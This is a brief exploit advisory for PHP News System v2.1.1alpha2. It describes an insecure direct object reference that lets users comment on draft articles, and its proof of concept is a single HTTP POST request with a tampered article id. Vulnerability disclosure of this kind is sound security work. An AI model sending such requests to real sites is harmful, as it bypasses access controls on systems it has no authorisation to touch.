# Exploit Title: PHP News System v2.1.1alpha2 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://sourceforge.net/projects/phpns/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: PHP News System
## Version: v2.1.1alpha2
## Exploit Description:
## PHP News System v2.1.1alpha2 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to add comment to article that is draft(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /shownews.php?a=3 HTTP/1.1
...
name=user3&email=user3%40test.com&website=&comment=user3&captcha=8&id=3(CHANGE HERE)&captcha_answer=NDg%3D
```